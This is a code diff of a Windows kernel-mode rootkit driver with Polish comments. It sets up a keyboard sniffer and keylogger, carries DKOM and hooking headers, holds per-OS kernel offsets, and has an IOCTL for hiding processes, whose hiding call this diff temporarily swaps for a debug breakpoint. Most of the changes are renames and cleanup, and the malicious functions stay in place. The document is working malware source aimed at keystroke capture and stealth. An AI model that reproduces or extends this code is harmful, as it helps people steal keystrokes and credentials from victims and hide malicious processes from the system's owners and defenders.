@@ -1,5 +1,3 @@
-// MYROOTKIT DEVICE DRIVER
-
 #include <ntddk.h>
 
 #include "rootkit.h"
@@ -8,13 +6,6 @@
 #include "rk_DKOM.h"
 #include "rk_Hook.h"
 #include "IoControl.h"
-
-typedef struct _SYSTEM_LOAD_AND_CALL_IMAGE 
-{ 
- UNICODE_STRING ModuleName; 
-} SYSTEM_LOAD_AND_CALL_IMAGE, *PSYSTEM_LOAD_AND_CALL_IMAGE; 
-
-#define SystemLoadAndCallImage	38 
 
 // We are going to set this to point to PsLoadedModuleList.
 PMODULE_ENTRY	gul_PsLoadedModuleList;  
@@ -48,22 +39,17 @@ ROOTKIT_SETUP_DATA WINXPSETUP		= { 0x0, 0x84, 0x88, 0xc4 , 0x0 , 0x1c, 0x8 , 0xA
 ROOTKIT_SETUP_DATA WINXPSP2SETUP	= { 0x0, 0x84, 0x88, 0xc4 , 0x0 , 0x1c, 0x8 , 0xA0, 0x04 };
 ROOTKIT_SETUP_DATA WIN2K3SETUP		= { 0x0, 0x84, 0x88, 0xc4 , 0x0 , 0x1c, 0x8 , 0xA0, 0x04 };
 
-#ifdef ALLOC_PRAGMA
-#pragma alloc_text (INIT, DriverEntry)
-#pragma alloc_text (PAGE, DispatchGeneral)
-#pragma alloc_text (PAGE, KeyboardAddDevice)
-#pragma alloc_text (PAGE, KeyboardUnload)
-#pragma alloc_text (PAGE, KeyboardPnP)
-#pragma alloc_text (PAGE, KeyboardPower)
-#endif // ALLOC_PRAGMA
+NTSTATUS DispatchGeneral(IN PDEVICE_OBJECT DeviceObject,IN PIRP Irp);
+NTSTATUS DriverEntry(IN PDRIVER_OBJECT  DriverObject,IN PUNICODE_STRING RegistryPath);
+BOOLEAN SetupOffsets();
 
 //Import NtBuildNumber from ntoskrnl.exe
 __declspec(dllimport) ULONG NtBuildNumber;
 
-NTSTATUS Driver_Create( IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp )
+NTSTATUS OnDriverCreate( IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp )
 {
 	NTSTATUS status = STATUS_SUCCESS;
-	DbgPrint("Driver_Create\n");
+	DbgPrint("ROOTKIT: OnDriverCreate\n");
 
 	Irp->IoStatus.Status = status;
 	Irp->IoStatus.Information = 0;
@@ -71,10 +57,10 @@ NTSTATUS Driver_Create( IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp )
 	return status;
 }
 
-NTSTATUS Driver_Close( IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp )
+NTSTATUS OnDriverClose( IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp )
 {
 	NTSTATUS status = STATUS_SUCCESS;
-	DbgPrint("Driver_Close DeviceObject: %x\n",DeviceObject);
+	DbgPrint("ROOTKIT: OnDriverClose");
 
 	Irp->IoStatus.Status = status;
 	Irp->IoStatus.Information = 0;
@@ -127,7 +113,7 @@ VOID OnUnload( IN PDRIVER_OBJECT DriverObject )
 	//ShutDownNdis();
 
 	//Delete symbolic link
-	RtlInitUnicodeString( &symbolicLink, ROOTKIT_DRIVER_WIN32_DEV_NAME );
+	RtlInitUnicodeString( &symbolicLink, ROOTKIT_WIN32_DEV_NAME );
 	IoDeleteSymbolicLink( &symbolicLink );
 
 	IoDeleteDevice(gp_KeyboardDevice);
@@ -173,10 +159,11 @@ NTSTATUS  Driver_IoControl( IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp )
 
 	case IOCTL_HIDE_PROCESS:
 		DbgPrint("Before IOCTL_HIDE_PROCESS\n");
-		if (inputSize == sizeof(ULONG)) {
-			DbgPrint("Lets hide something...");
-			OnProcessHide( *(ULONG*)pInputBuffer );
-		}
+		__asm int 3
+//		if (inputSize == sizeof(ULONG)) {
+//			DbgPrint("Lets hide something...");
+//			OnProcessHide( *(ULONG*)pInputBuffer );
+//		}
 		break;
 
 	default:
@@ -215,22 +202,15 @@ NTSTATUS DriverEntry( IN PDRIVER_OBJECT driverObject, IN PUNICODE_STRING theRegi
 
 	//do obslugi klawiatury
 	driverObject->MajorFunction[IRP_MJ_READ				] =	KeyBoardDispatchRead;
-//	driverObject->MajorFunction[IRP_MJ_POWER			] =	KeyboardPower;
-    //zeby wiedziec kiedy urzadzenie klawiatury jest odlaczone
-//	driverObject->MajorFunction[IRP_MJ_PNP				] = KeyboardPnP;
-
-//	driverObject->DriverUnload = KeyboardUnload;
-	//dla informacji o podpinaniu nowej klawiatury
-    //driverObject->DriverExtension->AddDevice = KeyboardAddDevice;
-
+	
 	//
-	driverObject->MajorFunction[ IRP_MJ_CREATE			] = Driver_Create;
-	driverObject->MajorFunction[ IRP_MJ_CLOSE			] = Driver_Close;
+	driverObject->MajorFunction[ IRP_MJ_CREATE			] = OnDriverCreate;
+	driverObject->MajorFunction[ IRP_MJ_CLOSE			] = OnDriverClose;
 	driverObject->MajorFunction[ IRP_MJ_DEVICE_CONTROL	] = Driver_IoControl; 
 
 	//unicode names initialization
-	RtlInitUnicodeString( &deviceName, ROOTKIT_DRIVER_DEV_NAME );
-	RtlInitUnicodeString( &symbolicName, ROOTKIT_DRIVER_WIN32_DEV_NAME );
+	RtlInitUnicodeString( &deviceName, ROOTKIT_DEV_NAME );
+	RtlInitUnicodeString( &symbolicName, ROOTKIT_WIN32_DEV_NAME );
 
 	//we are creating communication object that GUI can use to send requsts to driver
 	status = IoCreateDevice( driverObject, sizeof( ROOTKIT_EXT ),
@@ -275,8 +255,6 @@ NTSTATUS DriverEntry( IN PDRIVER_OBJECT driverObject, IN PUNICODE_STRING theRegi
 	gp_DeviceObject = driverObject->DeviceObject;
 
     //tutaj tworzymy urzadzenie dla klawiatury oraz inicjujemy
-
-	//starts up keyboard sniffer code...
 	KeyboardInit( driverObject, &gp_KeyboardDevice);
 	SetupKeylogger( gp_KeyboardDevice );	
 
@@ -349,7 +327,6 @@ NTSTATUS DispatchGeneral(IN PDEVICE_OBJECT DeviceObject,IN PIRP Irp)
 		DbgPrint("Dispach general else: DeviceObject: %x \n",DeviceObject);
 
 	// to sie nie powinno wywolywac NIGDY !
-	DbgPrint(" O so choci ??? :/\n");
     IoSkipCurrentIrpStackLocation(Irp);
     return IoCallDriver(((PROOTKIT_EXT) DeviceObject->DeviceExtension)->PrevDevice, Irp);
 }
